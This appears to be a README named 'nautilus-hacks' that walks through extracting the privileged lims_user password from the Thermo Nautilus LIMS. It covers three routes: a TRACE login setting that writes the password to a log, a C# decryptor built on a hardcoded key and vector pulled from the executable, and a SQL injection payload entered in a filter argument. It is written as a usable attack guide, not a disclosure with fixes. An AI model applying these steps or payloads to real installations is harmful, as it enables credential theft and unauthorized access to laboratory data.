# nautilus-hacks

## Getting lims_user password (#1)

Add a server with `TRACE` preceding the actual Database Type.  

![Server window with TRACE database type](img/01.jpg)

Make sure the "TRACE" part "sticks".  It might not if you create a new server entry, and you'll have to edit the properties. 
You'll know it is good to go when you see "TRACE" in the server list.

![Server list showing TRACE prefix](img/02.jpg)

Select the trace server and login.

![Login window with trace server selected](img/03.jpg)

The Database Trace window appears.  You can clear all the checkboxes and provide a log location for saving.

![Database trace window](img/04.jpg)

Once you click OK in the Database Trace window, you will be logged in and the Nautilus client will be logging.  
Log out immediately and close Nautilus.

Navigate to the location you saved your trace log.

![Windows explorer at log location](img/06.jpg)

Open the log and find the keys to the kingdom.  Good grief.

![Log file showing lims_user password](img/07.jpg)


## Getting lims_user password (#2)

Login (any user with lims_readonly) and run query:   

```sql
select lims_security.get_role_security from dual;
```

(If you don't have a means of connecting to the database other than the Nautilus client, see section 
on "Get Nautilus to cough up unintended data using SQL injection").

Will give back something like `H7y5bAD1IidlB1YqxVyusw==`, which is the encrypted password.

Open the .Net IL disassembler, ildasm.exe.  When Visual Studio is installed, ildasm can be found in a path such as `C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.6.1 Tools`.

In ildasm, open NautilusRoleSecurity.exe, which is typically installed in `C:\Nautilus`.  When the exe has been loaded, select File > Dump.  The only required option is "Dump IL Code".  Open the dumped ".il" file with a text editor.  Search for "Vector" and/or "Key" and find the two private field values, like this:

```
.field static assembly literal string Key = "Nautilus"
.field static assembly literal string Vector = "Secret"
```

Make a note of the `Key` and `Vector` values.

Create a new C# console application.  Add `Thermo.Nautilus.BL.Services.dll` as a reference.  It can be found next to NautilusRoleSecurity.exe or next to Nautilus.exe.  Here is example code for the console application:

```csharp
using System;
using Thermo.Nautilus.BL.Services;

namespace DecryptNautilusPasswords
{
    class Program
    {
        static void Main(string[] args)
        {
            try 
            {
                if (args.Length < 3) throw new ArgumentException();
                
                var decrypted = string.Empty;
                var sym = new SymmCrypto();
                sym.Decrypt(args[0], args[1], args[2], out decrypted);
                Console.WriteLine(decrypted);
            }
            catch (Exception) 
            {
                Console.WriteLine("Failed to decrypt.  Try again, passing args in this order: 1.Key 2.Vector 3.EncryptedPassword");
            }
        }
    }
}

```

And here is how the example compiled executable would work:

```shell
> ExecutableName.exe Nautilus Secret H7y5bAD1IidlB1YqxVyusw==
secret123
```

The output is the decrypted password. (In this case, "secret123")

This same process works for encrypted values in the registry (BGP username, password at `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Thermo\Nautilus\9.3\BGP#servername#instancename#x\ParameterX`).



## Get Nautilus to cough up unintended data using SQL injection

Go to a folder that uses a filter with a text argument.  For this example, there is a folder for finding a plate by its name.
The filter looks like this:

![Filter properties showing where statement](img/08.jpg)

Change the plate entity's view settings to show only the name.  This will make the SQL injection simpler:

![Explorer columns window for plate entity showing only Name column](img/09.jpg)

Refresh the filter.  In the filter arguments window, provide the SQL injection string as the text value.  
The injection string must close the substituted string with a `'` character, append a right paren, then `union` the 
query to inject.  The unioned select must have an ID value (can be `0`), then the column of
the info you want displayed *TWICE*, then a status column (using `'X'` here), then six string values (use `''`).  After the 
injected query, remember to add `--` to comment out the remainder of the hard coded SQL. For example, to get this plate
view to display the encrypted lims_role password, use the following as the text argument in the "Plate by name" filter:

```
') union SELECT 0, lims_security.get_role_security, lims_security.get_role_security,'X','','','','','','' from dual  -- 
```

Like so:

![Filter args window showing injected SQL value](img/10.jpg)

The result should be exactly what it is you wanted to see:

![Explorer window showing result of injected SQL](img/11.jpg)
